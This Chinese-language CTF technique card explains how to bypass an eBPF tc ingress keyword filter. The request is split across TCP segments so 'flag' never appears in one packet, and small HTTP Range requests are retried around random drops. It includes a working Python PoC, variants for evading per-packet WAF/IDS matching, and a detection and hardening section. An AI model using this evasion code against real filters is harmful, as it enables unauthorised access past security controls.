---
id: web-generic-http-smuggling-ebpf-tc-header-scan-percent-random-drop
title: eBPF tc ingress 逐包关键字过滤绕过：TCP 分段打散 "flag" + TCP 头 0x25 随机丢包下 Range 小步重试
type: scenario
domain: web
path: web/generic/http-smuggling
technique: ebpf-tc-header-scan-percent-random-drop-segment-bypass
aliases:
- eBPF 防火墙绕过
- tc ingress 关键字过滤
- TCP 分段绕过关键字
- Range 分块重试
- UofTCTF Firewall
tags:
- ctf
- web
- ebpf
- tc
- firewall
- tcp
- segment
- bypass
- range
cve: []
severity: medium
confidence: medium
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V166
  verified_at: '2026-11-06T13:58:02+08:00'
  notes: 已对照原文核对：eBPF tc/ingress 仅 IPv4/TCP、拒绝 MF|OFFSET 分片、从 ETH_HLEN+ip_hdr_size 扫描 TCP Header+Payload（has_blocked_kw 找连续 flag、has_blocked_char 找 0x25）、无 TCP 流重组；exp 先 send('GET /fl')、sleep(0.1) 再发 tail，并用 Range 步长3+206/416 重试，均与原文代码一致。原文 Firewall 无 flag 截图，故 confidence medium 与证据匹配。无 sources/source_url；技术卡无产品版本。未在本机复跑。
---

## 一句话结论

当服务端前置的是无状态、按单个数据包扫描字符串的 eBPF tc ingress 过滤器（示例拦截连续 `flag` 与单字节 `%`）时，把请求行拆成两次 `send()` 让“fl”和“ag”落在不同 TCP segment，即可绕过关键字匹配；对 `%` 引起的随机丢包则用 HTTP `Range` 小步长分块下载加无限重试，直到拿全 `/flag.html`。

## 原理

- 示例 eBPF 程序挂在 `tc/ingress`，只处理 IPv4/TCP，拒绝 IP 分片（`IP_MF|IP_OFFSET` 置位即 `TC_ACT_SHOT`），然后从 `ETH_HLEN + ip_hdr_size`（TCP 头起始）开始扫描 `ip_tot_len - ip_hdr_size` 字节，即 **TCP Header + TCP Payload**：
  - `has_blocked_kw()` 用 `bpf_loop` 逐偏移比较 4 字节，发现连续 `"flag"` 即丢包；
  - `has_blocked_char()` 逐字节找 `0x25`（`%`），发现即丢包。
- **没有 TCP 流重组**：过滤器只看当前 skb 内的连续字节，不跨 segment 拼接。TCP 是字节流，客户端可以控制 `send()` 边界（配合 `TCP_NODELAY` 或短 sleep），让内核/对端看到两个 segment；`GET /fl` 与 `ag.html` 分开后，任何单个包内都不存在连续 `"flag"`。
- **`%` 的随机丢包**：扫描范围包含 TCP 头（seq、ack、窗口、校验和等），这些字段出现 `0x25` 的概率不低，因此正常请求也会偶发被丢。单次请求无法稳定控制，所以用 `Range: bytes=start-end` 每次只取一小段（示例步长 3），失败就重试同一段，成功（206）再推进；文件结束返回 416。
- **为什么不能靠 IP 分片**：程序显式拒绝带 MF/OFFSET 的 IPv4 分片，只能走 TCP 分段。

## 触发条件

- 过滤器按包做固定关键字/字符匹配，且不做 TCP 重组（eBPF tc/XDP、简单 iptables `string` 模块、部分老式 IDS/IPS 规则）。
- 目标为 IPv4 TCP，IP 分片被拒绝；HTTP 服务支持 `Range`（返回 206/416）。
- 客户端能控制发送分段（Python socket + sleep / TCP_NODELAY），且能接受丢包重试。

## 利用步骤

1. 直接请求 `/flag.html` 确认被丢包（无响应/连接重置），并用可控请求确认过滤器命中 `"flag"` 与 `%`。
2. 客户端建立到目标的 TCP 连接，先发送 `GET /fl`，`sleep(0.1)` 或设置 `TCP_NODELAY` 后再发送 `ag.html HTTP/1.1\r\nHost: ...\r\nRange: bytes=0-2\r\nConnection: close\r\n\r\n`。
3. 读取响应：`206 Partial Content` 则把 body 追加到结果并推进 offset；`416 Range Not Satisfiable` 表示到达文件末尾。
4. 无响应/非预期响应视为撞到 `%` 被丢包，重试同一 Range；步长越小，单请求命中 `%` 的概率越低，但请求数增多。
5. 拼出完整 HTML 后提取 flag。

## PoC

```python
import socket, time

HOST, PORT = "target", 5000

def chunk(start, end):
    s = socket.socket(); s.settimeout(2.0)
    try:
        s.connect((HOST, PORT))
        tail = (f"ag.html HTTP/1.1\r\nHost: {HOST}\r\n"
                f"Range: bytes={start}-{end}\r\nConnection: close\r\n\r\n").encode()
        s.sendall(b"GET /fl")     # 第一段：不含连续 flag
        time.sleep(0.1)           # 强制第二个 TCP segment
        s.sendall(tail)
        resp = b""
        while True:
            try:
                c = s.recv(4096)
                if not c: break
                resp += c
            except socket.timeout:
                break
        if b"\r\n\r\n" not in resp: return None, b""
        head, body = resp.split(b"\r\n\r\n", 1)
        if b"206 Partial" in head: return 206, body
        if b"416 Range" in head: return 416, b""
        return None, b""
    except Exception:
        return None, b""
    finally:
        s.close()

out, off, step = bytearray(), 0, 3
while True:
    st, body = chunk(off, off + step - 1)
    if st == 206:
        out += body; off += step
    elif st == 416:
        break
    # 其他状态（丢包）重试同一段
print(out.decode(errors="ignore"))
```

## 变体与关联

- **关键字跨段拆分**：任意被拦截的固定字符串都可拆到两个 segment；注意不要在同一段内出现完整关键字。
- **TCP 选项/填充**：调小 MSS、使用 `TCP_NODELAY`、发送带时间间隔的两段，控制分段更稳定。
- **应用层替代**：HTTP/1.1 分块传输、请求行拆分到多个读事件、慢速发送；对只做单包匹配的 WAF/IDS 同样有效。
- **边界**：过滤器若做流重组（Suricata stream、应用层 WAF）或匹配跨包状态，此方法失效；IP 分片被禁时不能用分片绕过。
- **关联**：`web-generic-http-smuggling` 系列（HTTP 解析差异）；本卡聚焦“按包字符串匹配 + 无重组”的绕过。

## 检测与防御

- **过滤器实现**：在 eBPF/IDS 中做 TCP 流重组后再匹配，或把匹配放到应用层（HTTP parser 之后）；不要只扫描单个 skb。
- **检测**：同一连接内两次短间隔 send、请求行被异常分割（TCP segment 边界落在 URL/关键字中间）；大量小 Range 请求（步长 1–5）与高重试率；`Range` 请求首尾相接且来源单一。
- **加固**：对关键路径禁用 Range 或限制 Range 粒度；对异常分段/重试行为限速；HTTP 层关键字过滤与内核层过滤取并集。
